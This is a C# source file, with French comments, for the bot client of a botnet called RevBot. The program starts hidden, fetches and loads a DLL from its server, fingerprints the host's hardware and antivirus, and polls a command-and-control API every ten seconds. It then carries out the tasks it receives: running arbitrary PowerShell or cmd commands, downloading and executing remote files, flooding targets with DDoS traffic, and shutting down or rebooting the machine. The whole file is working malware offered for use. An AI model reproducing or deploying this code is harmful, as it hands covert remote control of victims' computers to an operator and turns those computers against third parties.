using System;
using System.Collections.Generic;
using System.Diagnostics;

using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using System.Threading;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using System.Reflection;
using System.IO;

namespace RevBot1
{
    internal class Program
    {
        // Déclaration des variables globales
        static string url = "http://localhost/RevBot/?p=api";
        static string url_dep_1 = "http://localhost/RevBot/Newtonsoft.Json.dll";
        static string key = "TESTAPIKEY";
        static string user_token = "USER_wCqXVKeWEkaAzd5PsGZY";
        static string group_token = "GROUP_9jZ58W2NoyFA7mxGSY0l";
        static string hwid = "";
        static string pcname = Environment.MachineName;
        static string username = Environment.UserName;
        static string busy = "0";
        static string anti = "";
        static string curr_task = "0";
        static string[] taskArray;

        // Méthode principale
        static bool DownloadFile(string fileUrl, string destinationPath)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(fileUrl, destinationPath);
                }

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Erreur lors du téléchargement du fichier : " + ex.Message);
                return false;
            }
        }
        static void Main()
        {

            // Exécution du gestionnaire de démarrage
            StartupManager.RunHidden();
            DownloadFile(url_dep_1, Path.GetTempPath() + "Newtonsoft.Json.dll");
            string assemblyPath = @Path.GetTempPath() + "Newtonsoft.Json.dll";
            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
{                   
            // Spécifiez ici le chemin d'accès à la DLL 


            if (File.Exists(assemblyPath))
            {
             return Assembly.LoadFrom(@assemblyPath);
            }
             return null;
            };

            // Récupération des données
            GetData();

            // Démarrage du minuteur pour effectuer la requête périodique
            Timer timer = new Timer(TimerCallback, null, TimeSpan.Zero, TimeSpan.FromSeconds(10));

            // Attendre indéfiniment pour maintenir l'application en cours d'exécution
            Console.ReadLine();
        }

        // Méthode pour récupérer les données
        static void GetData()
        {
            hwid = GenerateHWID();
            anti = GetAntivirusName();
        }

        // Méthode de rappel du minuteur
        static void TimerCallback(object state)
        {
            // Effectuer la requête
            Alive();
            GetTask();
        }

        // Méthode pour envoyer un signal de vie
        static void Alive()
        {
            // Création des paramètres de la requête
            Dictionary<string, object> parameters = new Dictionary<string, object>();

            parameters.Add("request", "request");
            parameters.Add("API_KEY", key);
            parameters.Add("HWID", hwid);
            parameters.Add("USER_TOKEN", user_token);
            parameters.Add("GROUP_TOKEN", group_token);
            parameters.Add("PCNAME", pcname);
            parameters.Add("USERNAME", username);
            parameters.Add("BUSY", busy);
            parameters.Add("ANTI_VIRUS", anti);

            // Envoi de la requête POST
            string jsonResponse = PostRequest(url, parameters);
            Console.WriteLine(jsonResponse); // Affichage de la réponse (facultatif)
        }

        // Méthode pour récupérer la tâche
        static void GetTask()
        {
            // Création des paramètres de la requête
            Dictionary<string, object> parameters = new Dictionary<string, object>();
            parameters.Add("task", "task");
            parameters.Add("API_KEY", key);
            parameters.Add("HWID", hwid);
            parameters.Add("USER_TOKEN", user_token);
            parameters.Add("GROUP_TOKEN", group_token);
            parameters.Add("PCNAME", pcname);
            parameters.Add("USERNAME", username);
            parameters.Add("BUSY", busy);
            parameters.Add("ANTI_VIRUS", anti);

            // Envoi de la requête POST
            string jsonResponse = PostRequest(url, parameters);

            // Vérification de la réponse
            if (jsonResponse != null)
            {
                JObject obj = JObject.Parse(jsonResponse);
                Console.WriteLine(jsonResponse);
                string type = null;

                if (obj["status"]?.ToString() == "idle" && obj["message"]?.ToString() == "No task found")
                {
                    Console.WriteLine("Aucune tâche trouvée.");
                }
                else
                {
                    string task_token = obj["TOKEN"]?.ToString();
                    busy = "1";

                    if (obj["TYPE"] != null)
                    {
                        type = (string)obj["TYPE"];
                        Console.WriteLine(type);
                    }
                    else
                    {
                        Console.WriteLine("Type non trouvé.");
                    }

                    if (obj["ARG_ARRAY"] != null)
                    {
                        string argArrayString = obj["ARG_ARRAY"].ToString();
                        string decodedArgArrayString = argArrayString.Replace("\\", "").Trim('"');
                        JObject argArrayObj = JObject.Parse(decodedArgArrayString);
                        foreach (var property in argArrayObj.Properties())
                        {
                            Console.WriteLine("Clé : " + property.Name);
                            Console.WriteLine("Valeur : " + property.Value);
                        }
                    }

                    if (type != null)
                    {
                        RunTask(task_token, type, obj["ARG_ARRAY"]);
                    }
                    else
                    {
                        Console.WriteLine("Erreur: La clé 'ARG_ARRAY' est manquante dans le JSON.");
                    }
                }
            }
            else
            {
                Console.WriteLine("La réponse de la requête est null.");
            }
        }


        static void RunTask(string task_token, string type, object args)
        {
            if (type == "shutdown")
            {
                run_shutdown(task_token);
            }
            else if (type == "reboot")
            {
                run_reboot(task_token);
            }
            else if (type == "powershell")
            {
                RunCommand(task_token, args, "powershell");
            }
            else if (type == "cmd")
            {
                RunCommand(task_token, args, "cmd");
            }
            else if (type == "dlexec")
            {
                Dlexex(task_token, args);
            }else if (type == "close"){
                xinteract(task_token, type);
            }
            else if (type == "uninstall")
            {
                xinteract(task_token, type);
            }
            else if (type == "ddos")
            {
                // Vérifier si la clé "ARG_ARRAY" existe
                if (args != null)
                {
                    // Extraire la valeur de "ARG_ARRAY" et décoder la chaîne JSON interne
                    string argArrayString = args.ToString();
                    string decodedArgArrayString = argArrayString.Replace("\\", "").Trim('"');

                    // Analyser la chaîne JSON de "ARG_ARRAY" en tant qu'objet JObject
                    JObject argArrayObj = JObject.Parse(decodedArgArrayString);

                    // Accéder aux valeurs des propriétés à l'intérieur de "ARG_ARRAY"
                    string duration = (string)argArrayObj["DURATION"];
                    string host = (string)argArrayObj["HOST"];
                    string port = (string)argArrayObj["PORT"];
                    string method = (string)argArrayObj["METHOD"];

                    if (int.TryParse(duration, out int durationx))
                    {
                        // Assigner la durée convertie en entier à dos.duration
                        dos.duration = durationx;
                    }

                    dos.host = host;
                    dos.method = method;
                    if (int.TryParse(port, out int pport))
                    {


                        // Assigner la durée convertie en entier à dos.duration
                        dos.port = pport;
                    }
                    dos.host = host;

                    // Afficher les valeurs extraites
                    Console.WriteLine("DURATION : " + duration);
                    Console.WriteLine("HOST : " + host);
                    Console.WriteLine("PORT : " + port);
                    Console.WriteLine("METHOD : " + method);
                    dos.Start(task_token);
                    Dictionary<string, object> parameters = new Dictionary<string, object>();
                    parameters.Add("run_task", task_token);
                    parameters.Add("API_KEY", key);
                    parameters.Add("HWID", hwid);
                    parameters.Add("USER_TOKEN", user_token);
                    parameters.Add("GROUP_TOKEN", group_token);
                    parameters.Add("PCNAME", pcname);
                    parameters.Add("USERNAME", username);
                    parameters.Add("BUSY", busy);
                    parameters.Add("ANTI_VIRUS", anti);

                    // Créez un objet anonyme contenant les données JSON
                    var jsonData = new
                    {
                        duration = duration,
                        host = host,
                        port = port,
                        method = method,
                        mbps = dos.total_mbps,
                        rs = dos.total_ms
                    };

                    // Ajoutez l'objet JSON à un objet contenant toutes les données
                    parameters.Add("DATA", JsonConvert.SerializeObject(jsonData).ToLower());

                    string jsonResponse = PostRequest(url, parameters);
                    Console.WriteLine(jsonResponse);
                    JObject obj = JObject.Parse(jsonResponse);
                }
                else
                {
                    Console.WriteLine("La clé 'ARG_ARRAY' n'existe pas dans le JSON.");
                }
            }
        }
        public static void xinteract(string task_token,string xtype)
        {
    busy = "1";
   
            Dictionary<string, object> parameters = new Dictionary<string, object>();
            parameters.Add("run_task", task_token);
            parameters.Add("API_KEY", key);
            parameters.Add("HWID", hwid);
            parameters.Add("USER_TOKEN", user_token);
            parameters.Add("GROUP_TOKEN", group_token);
            parameters.Add("PCNAME", pcname);
            parameters.Add("USERNAME", username);
            parameters.Add("BUSY", busy);
            parameters.Add("ANTI_VIRUS", anti);

            // Créez un objet anonyme contenant les données JSON
            var jsonData = new
            {
                type = xtype,
            };

            // Ajoutez l'objet JSON à un objet contenant toutes les données
            parameters.Add("DATA", JsonConvert.SerializeObject(jsonData).ToLower());

            string jsonResponse = PostRequest(url, parameters);
            Console.WriteLine(jsonResponse);
            JObject obj = JObject.Parse(jsonResponse);

            if (xtype == "uninstall")
            {
       
                interact.type = "uninstall";
            }
            else if(xtype == "close")
            {
                interact.type = "close";
            }
            // Appelez la méthode Run() directement via le nom de la classe
            busy = "0";
            interact.Run();
 
        }

        static void RunCommand(string task_token, object args, string type = "powershell")
        {
            // Extraire la valeur de "ARG_ARRAY" et décoder la chaîne JSON interne
            // Extraire la valeur de "ARG_ARRAY" et décoder la chaîne JSON interne
            string argArrayString = args.ToString();
            string decodedArgArrayString = argArrayString.Replace("\\", "").Trim('"');

            // Analyser la chaîne JSON de "ARG_ARRAY" en tant qu'objet JObject
            JObject argArrayObj = JObject.Parse(decodedArgArrayString);

            // Accéder aux valeurs des propriétés à l'intérieur de "ARG_ARRAY"
            string command = (string)argArrayObj["COMMAND"];
            string access = (string)argArrayObj["ACCESS"];
            ShellRun.command = command;
            ShellRun.access = access;
            ShellRun.type = type;


            ShellRun.Run();
            Console.WriteLine("Commande exécutée : " + command);
            Dictionary<string, object> parameters = new Dictionary<string, object>();
            parameters.Add("run_task", task_token);
            parameters.Add("API_KEY", key);
            parameters.Add("HWID", hwid);
            parameters.Add("USER_TOKEN", user_token);
            parameters.Add("GROUP_TOKEN", group_token);
            parameters.Add("PCNAME", pcname);
            parameters.Add("USERNAME", username);
            parameters.Add("BUSY", busy);
            parameters.Add("ANTI_VIRUS", anti);

            // Créez un objet anonyme contenant les données JSON
            var jsonData = new
            {
                command = command,
    
    
            };

            // Ajoutez l'objet JSON à un objet contenant toutes les données
            parameters.Add("DATA", JsonConvert.SerializeObject(jsonData).ToLower());

            string jsonResponse = PostRequest(url, parameters);
            Console.WriteLine(jsonResponse);
            JObject obj = JObject.Parse(jsonResponse);
        }

        static void Dlexex(string task_token, object args)
        {
            busy = "1";
            // Extraire la valeur de "ARG_ARRAY" et décoder la chaîne JSON interne
            string argArrayString = args.ToString();
            string decodedArgArrayString = argArrayString.Replace("\\", "").Trim('"');

            // Analyser la chaîne JSON de "ARG_ARRAY" en tant qu'objet JObject
            JObject argArrayObj = JObject.Parse(decodedArgArrayString);

            // Accéder aux valeurs des propriétés à l'intérieur de "ARG_ARRAY"
            string urls = (string)argArrayObj["URL"];
            string file_type = (string)argArrayObj["FILE_TYPE"];
            string access = (string)argArrayObj["ACCESS"];

            // Instancier un objet de la classe dlexec
            dlexec dlexecInstance = new dlexec();

            // Affecter l'URL à la propriété url de l'objet dlexec
            dlexecInstance.url = urls;
            dlexecInstance.extension = file_type;
            dlexecInstance.runtype = access;
            dlexecInstance.DownloadAndRun();

            busy = "0";

            Dictionary<string, object> parametersd = new Dictionary<string, object>();
            parametersd.Add("run_task", task_token);
            parametersd.Add("API_KEY", key);
            parametersd.Add("HWID", hwid);
            parametersd.Add("USER_TOKEN", user_token);
            parametersd.Add("GROUP_TOKEN", group_token);
            parametersd.Add("PCNAME", pcname);
            parametersd.Add("USERNAME", username);
            parametersd.Add("BUSY", busy);
            parametersd.Add("ANTI_VIRUS", anti);
            var jsonDatas = new
            {
                url = urls,
                type = file_type,
                access = access,
            };

            // Convertissez l'objet en une chaîne JSON
            string jsonDataString = JsonConvert.SerializeObject(jsonDatas);

            // Ajoutez la chaîne JSON à votre dictionnaire de paramètres
            parametersd.Add("DATA", jsonDataString);

            // Envoie de la demande POST et récupération de la réponse
            string jsonResponse = PostRequest(url, parametersd);

            // Traitement de la réponse
            Console.WriteLine(jsonResponse);
        }

        static void run_shutdown(string task_token)
        {
            Dictionary<string, object> parameters = new Dictionary<string, object>();
            parameters.Add("run_task", task_token);
            parameters.Add("API_KEY", key);
            parameters.Add("HWID", hwid);
            parameters.Add("USER_TOKEN", user_token);
            parameters.Add("GROUP_TOKEN", group_token);
            parameters.Add("PCNAME", pcname);
            parameters.Add("USERNAME", username);
            parameters.Add("BUSY", busy);
            parameters.Add("ANTI_VIRUS", anti);
            var jsonData = new
            {
                shutdown = "shudown",
            };

            parameters.Add("DATA", jsonData);
            string jsonResponse = PostRequest(url, parameters);
            JObject obj = JObject.Parse(jsonResponse);
            Console.WriteLine(jsonResponse);

            Console.WriteLine("RUN SHUTDOWN !!");
            busy = "0";
            string command = "shutdown / s / t 0"; // Remplacez "votre_commande" par la commande que vous souhaitez exécuter

            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command);
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;

            Process process = Process.Start(psi);
            process.WaitForExit();
            int exitCode = process.ExitCode;
        }

        static void run_reboot(string task_token)
        {
            Dictionary<string, object> parameters = new Dictionary<string, object>();
            parameters.Add("run_task", task_token);
            parameters.Add("API_KEY", key);
            parameters.Add("HWID", hwid);
            parameters.Add("USER_TOKEN", user_token);
            parameters.Add("GROUP_TOKEN", group_token);
            parameters.Add("PCNAME", pcname);
            parameters.Add("USERNAME", username);
            parameters.Add("BUSY", busy);
            parameters.Add("ANTI_VIRUS", anti);
            var jsonData = new
            {
                reboot = "reboot",
            };

            parameters.Add("DATA", jsonData);
            string jsonResponse = PostRequest(url, parameters);
            JObject obj = JObject.Parse(jsonResponse);
            Console.WriteLine(jsonResponse);

            Console.WriteLine("RUN SHUTDOWN !!");
            busy = "0";
            string command = "shutdown /r /t 0"; // Remplacez "votre_commande" par la commande que vous souhaitez exécuter

            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command);
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;

            Process process = Process.Start(psi);
            process.WaitForExit();
            int exitCode = process.ExitCode;
        }

        static string GenerateHWID()
        {
            // Concatenate various hardware identifiers
            string cpuId = GetProcessorId();
            string diskId = GetDiskId();
            string baseboardId = GetBaseboardId();

            // Concatenate the identifiers
            string combinedId = cpuId + diskId + baseboardId;

            // Compute a hash of the combined identifier to create the HWID
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(combinedId));
                StringBuilder builder = new StringBuilder();
                foreach (byte b in hashBytes)
                {
                    builder.Append(b.ToString("X2"));
                }
                return builder.ToString();
            }
        }

        static string GetProcessorId()
        {
            string result = "";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
            foreach (ManagementObject obj in searcher.Get())
            {
                result += obj["ProcessorId"].ToString();
            }
            return result;
        }

        static string GetDiskId()
        {
            string result = "";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_DiskDrive WHERE MediaType = 'Fixed hard disk media'");
            foreach (ManagementObject obj in searcher.Get())


            {
                result += obj["SerialNumber"].ToString();
            }
            return result;
        }

        static string GetBaseboardId()
        {
            string result = "";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BaseBoard");
            foreach (ManagementObject obj in searcher.Get())
            {
                result += obj["SerialNumber"].ToString();
            }
            return result;
        }

        static string GetAntivirusName()
        {
            string softwareKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";

            using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(softwareKey))
            {
                if (rk != null)
                {
                    foreach (string skName in rk.GetSubKeyNames())
                    {
                        using (RegistryKey sk = rk.OpenSubKey(skName))
                        {
                            string displayName = sk.GetValue("DisplayName") as string;
                            if (displayName != null && displayName.ToLower().Contains("antivirus"))
                            {
                                return displayName;
                            }
                        }
                    }
                }
            }
            return "No Antivirus Found";
        }

        static string PostRequest(string url, Dictionary<string, object> parameters)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    // Créer un objet de type NameValueCollection pour contenir les paramètres POST
                    var data = new System.Collections.Specialized.NameValueCollection();

                    // Ajouter chaque élément du dictionnaire aux paramètres POST
                    foreach (var item in parameters)
                    {
                        data.Add(item.Key, item.Value.ToString());
                    }

                    // Envoyer la demande POST et récupérer la réponse
                    byte[] responseBytes = wc.UploadValues(url, "POST", data);

                    // Convertir la réponse en chaîne et la renvoyer
                    return Encoding.UTF8.GetString(responseBytes);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return null;
            }
        }
    }
}


